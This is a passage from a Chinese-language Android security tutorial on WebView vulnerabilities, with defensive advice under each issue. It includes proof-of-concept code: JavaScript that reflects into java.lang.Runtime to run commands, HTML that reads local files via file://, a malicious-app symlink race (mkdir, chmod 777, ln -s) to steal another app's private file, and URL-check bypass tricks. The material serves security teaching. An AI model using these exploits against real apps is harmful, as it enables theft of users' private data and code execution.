class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p><p>onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</p><p>还可以使用<strong>WebView.evaluateJavascript()</strong>调用js代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Webview漏洞-1"><a href="#Webview漏洞-1" class="headerlink" title="Webview漏洞"></a>Webview漏洞</h3><h4 id="漏洞类型概括"><a href="#漏洞类型概括" class="headerlink" title="漏洞类型概括"></a>漏洞类型概括</h4><p><img src="https://bbs.kanxue.com/upload/attach/202207/905443_E25ZWREXH5JZHN2.png" alt="image-20220729145936266"></p><p><img src="2025-01-15-App安全分析指南/905443_C8YTUCX4746WZHB-17271001469662.png" alt="image-20220729152654652"></p><h4 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h4><h5 id="Webview任意代码执行漏洞"><a href="#Webview任意代码执行漏洞" class="headerlink" title="Webview任意代码执行漏洞"></a>Webview任意代码执行漏洞</h5><p><strong>addJavascriptInterface接口引起远程代码执行漏洞</strong></p><p><strong>漏洞原理</strong></p><p>JS和Android的直接通信可以通过addJavascriptInterface接口进行对象映射</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JSObject(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// 参数1：Android的本地对象</span></span><br><span class="line"><span class="comment">// 参数2：JS的对象</span></span><br><span class="line"><span class="comment">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure><p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p><p>具体的攻击步骤：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android中的对象有一公共的方法：getClass()</span><br><span class="line">（<span class="number">2</span>）该方法可以获取到当前类 类型<span class="keyword">Class</span></span><br><span class="line">（<span class="number">3</span>）该类有一关键的方法： <span class="keyword">Class</span>.forName；</span><br><span class="line">（<span class="number">4</span>）该方法可以加载一个类（可加载 java.lang.<span class="keyword">Runtime</span> 类）</span><br><span class="line">（<span class="number">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure><p><strong>示例代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞防护</strong></p><p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用。</p><h5 id="webview明文存储漏洞"><a href="#webview明文存储漏洞" class="headerlink" title="webview明文存储漏洞"></a>webview明文存储漏洞</h5><p>WebView默认开启密码保存功能 ：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure><p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p><p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p><p><strong>安全防护：</strong></p><p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p><h4 id="跨域漏洞"><a href="#跨域漏洞" class="headerlink" title="跨域漏洞"></a><strong>跨域漏洞</strong></h4><p>WebView开启了file域访问，且允许file域对http域进行访问，同时未对file域的路径进行严格限制所致，攻击者通过URL Scheme的方式，可远程打开并加载恶意HTML文件，远程获取app中包括用户登录凭证在内的所有本地敏感数据。</p><p>针对这个漏洞，涉及如下几个api函数：</p><p><img src="2025-01-15-App安全分析指南/image-20240930170405744.png" alt="image-20240930170405744"></p><h5 id="任意文件窃取-应用克隆漏洞"><a href="#任意文件窃取-应用克隆漏洞" class="headerlink" title="任意文件窃取(应用克隆漏洞)"></a>任意文件窃取(应用克隆漏洞)</h5><p><strong>漏洞原理</strong></p><p>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p><p>这样使得WebView可以使用File协议和加载js代码读取本地文件，这样会导致攻击者操作用户点击后无感知下载恶意的HTML/JS，并窃取相关的私有文件信息。</p><p><strong>漏洞复现</strong></p><p>我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p><p> <img src="2025-01-15-App安全分析指南/905443_D6RRGQX47ZWBV4B.png" alt="image-20220729195648955"></p><p>编写一个js文件来读取本地文件：<strong>fileAttack.html</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)  <span class="comment">//当XMLHttpRequest发生变化时 触发回调</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)          <span class="comment">//请求是否完成     </span></span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们将这个文件上传至手机 /data/local/tmp下</p><p>编写攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">   webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p><h5 id="通用协议漏洞-恶意页面注入"><a href="#通用协议漏洞-恶意页面注入" class="headerlink" title="通用协议漏洞(恶意页面注入)"></a>通用协议漏洞(恶意页面注入)</h5><p>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p><p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p><p>我们将上面html中的访问改为看雪的网站：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">   webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p><h5 id="安全防护-1"><a href="#安全防护-1" class="headerlink" title="安全防护"></a><strong>安全防护</strong></h5><ul><li>检查应用是否使用了webview控件</li><li>避免app内部的webview被不信任的第三方调用，排查内置webview的activity是否被导出，必须导出的activity是否会通过参数传递调起内置的webview</li><li>file域访问为非必要功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li></ul><p>若要开启file域访问，则设置file路径的白名单，严格控制file域访问范围，具体如下</p><ul><li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:///android_asset 和 file:///android_res 在不开启 API 的情况下也可以访问；</li><li>可能会更新的 HTML 文件放在 /data/data/(app) 目录下，避免被第三方替换或修改；</li><li>对 file 域请求做白名单限制时，需要对“…/…/”特殊情况进行处理，避免白名单被绕过。</li></ul><h5 id="符号链接跨源攻击"><a href="#符号链接跨源攻击" class="headerlink" title="符号链接跨源攻击"></a>符号链接跨源攻击</h5><p><a href="https://blog.csdn.net/qq_35993502/article/details/121371049">Android安全检测－WebView File域同源策略绕过漏洞</a></p><p>这类漏洞，只有<strong>setAllowFileAccess为True</strong></p><p><strong>漏洞原理</strong></p><p><img src="2025-01-15-App安全分析指南/905443_NW7GHWBMGDNE5TU.png" alt="image-20220729202532795"></p><p>攻击过程：首先是操控webview去访问攻击app自己公开的一个网页，然后这个网页执行的内容其实是延时去读取自身，在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软连接，指向受害者app的一个私有文件，最终读取窃取内容</p><p>构造HTML文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的HTML,被检测APP加载此html，执行JS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var d = document;</span><br><span class="line">function loadDatabase()</span><br><span class="line">&#123;</span><br><span class="line">    var file_url = d.URL;</span><br><span class="line">    var xmlhttp =new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onload=function() &#123;    //回调函数 当请求完成时执行</span><br><span class="line">         document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span><br><span class="line">        alert(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,file_url);</span><br><span class="line">    xmlhttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造恶意app的攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的攻击代码</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class="line">          #新建文件夹，用于存放恶意HTML文件</span><br><span class="line">           cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">           #将恶意HTML到恶意APP的沙盒目录</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #授权目录及其文件权限，允许其它应用访问</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #启动被攻击的APP，并携带恶意HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #延时<span class="number">6</span>秒</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #删除HTML文件</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #软链接文件，实现读取被攻击应用的<span class="keyword">private</span>.txt文件</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>目标样本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#被攻击的APP，有漏洞的代码</span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  允许加载File域</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #取出了恶意HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="安全防护-2"><a href="#安全防护-2" class="headerlink" title="安全防护"></a>安全防护</h6><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、设置<span class="keyword">set</span>AllowFileAccess方法为<span class="literal">false</span>,设置<span class="keyword">set</span>AllowFileAccessFromFileURLs和 </span><br><span class="line">    <span class="keyword">set</span>AllowUniversalAccessFromFileURLs为<span class="literal">false</span>。</span><br><span class="line">2、在Android4.0<span class="params">(API15)</span>及以下得采用其他方法进行手动校验是否访问file域</span><br><span class="line">3、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure><h5 id="污染cookie"><a href="#污染cookie" class="headerlink" title="污染cookie"></a>污染cookie</h5><p><a href="http://www.ctfiot.com/39656.html">Android-Webview中的漏洞利用总结</a></p><h4 id="URL配置漏洞"><a href="#URL配置漏洞" class="headerlink" title="URL配置漏洞"></a>URL配置漏洞</h4><p><a href="https://www.freebuf.com/vuls/201407.html">一文彻底搞懂安卓WebView白名单校验 - FreeBuf网络安全行业门户</a></p><p>许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞getUserInfo</p><p>URL的构造：</p><p><code>scheme://login:password@address:port/path/to/resource/?query_string#fragment</code></p><ul><li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:www.qq.com, 此外，多数浏览器在scheme之前<strong>加空格</strong>也是可以正常解析的</li><li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个<strong>不常见字段往往可以绕过</strong>很多检查</li><li>address<br>address字段可以是一个<strong>不区分大小写</strong>的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li><li>port<br>端口号</li><li>/path/to/resource<br>层级路径，可以使用“../”到上一级目录</li><li>query_string<br>查询字符串，格式为”query_string?name1=value1&amp;name2=value2”</li><li>fragment<br>用于html中的页面定位</li></ul><h5 id="URL绕过漏洞"><a href="#URL绕过漏洞" class="headerlink" title="URL绕过漏洞"></a>URL绕过漏洞</h5><p><a href="https://mabin004.github.io/2019/04/23/Android-WebView白名单绕过/">Android WebView URL检查绕过 | m4bln (mabin004.github.io)</a></p><p>看一个简单的url校验例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">    enableJavaScriptInterface();</span><br><span class="line">    <span class="comment">//或者webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用checkDomain对域名进行校验</p><p>实际中会发现这样的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是为了防止加载file的同源策略进行的防护，但是我们有很多绕过的方法</p><p><strong>总结</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.大写字母 <span class="keyword">File</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">2</span>.前面加上空格： <span class="keyword">file</span>:<span class="comment">//</span></span><br><span class="line"><span class="number">3</span>.字符编码：“<span class="keyword">file</span>：%<span class="number">2</span>F/”</span><br><span class="line"><span 